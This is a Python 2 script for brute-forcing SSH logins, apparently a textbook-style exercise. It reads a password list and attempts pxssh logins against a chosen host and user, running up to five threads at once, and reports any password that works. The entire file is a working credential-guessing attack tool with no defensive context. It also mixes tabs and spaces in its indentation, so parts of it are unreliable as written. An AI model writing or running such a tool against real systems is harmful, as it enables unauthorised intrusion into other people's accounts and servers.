# attempt to log in using list of passwords
from pexpect import pxssh 
import optparse
import time

from threading import *

maxConnections = 5

connection_lock = BoundedSemaphore(value = maxConnections)
Found = False
Fails = 0

# attempt to connect to host with password and user combination
def connect(host, user, password, release):
	global Found
	global Fails	
	try:
		s = pxssh.pxssh()
        s.login(host, user, password) # try to login with combo
		print '[+] Password Found: ' + password
		Found = True
    # if combo does not work
	except Exception, e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host,user, password, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, False)
	finally:
		if release: connection_lock.release()		
		
def main():
    # prompt will need target host user and list of passwords
	parser = optparse.OptionParser('usage%prog '+ '-H <target host> -u <user> -F <password list>')
	parser.add_option('-H', dest = 'tgtHost', type = 'string', help ='specity target host')
	parser.add_option('-F', dest ='passwdFile', type='string', help='specify password file')
	parser.add_option('-u', dest ='user', type = 'string', help = 'specify password file')

	(options, args) = parser.parse_args()
	host = options.tgtHost
	passwdFile = options.passwdFile
	user = options.user
    # check that all values are given
	if host == None or passwdFile == None or user == None:
		print parser.usage
		exit(0)
	fn = open(passwdFile,'r')

    # for all passwords in password text file
	for line in fn.readlines():
		if Found:
			print "[*] Exiting: Password Found"
			exit(0)
		if Fails >5:
			print "[!] Exiting: too many socket timeouts"
			exit(0)
		connection_lock.acquire()
        password = line.strip('\r').strip('\n') # password being tested
		print "[-] Testing: " + str(password)
		t = Thread(target = connect, args=(host, user, password, True))
		child = t.start()

if __name__ == '__main__':
	main()


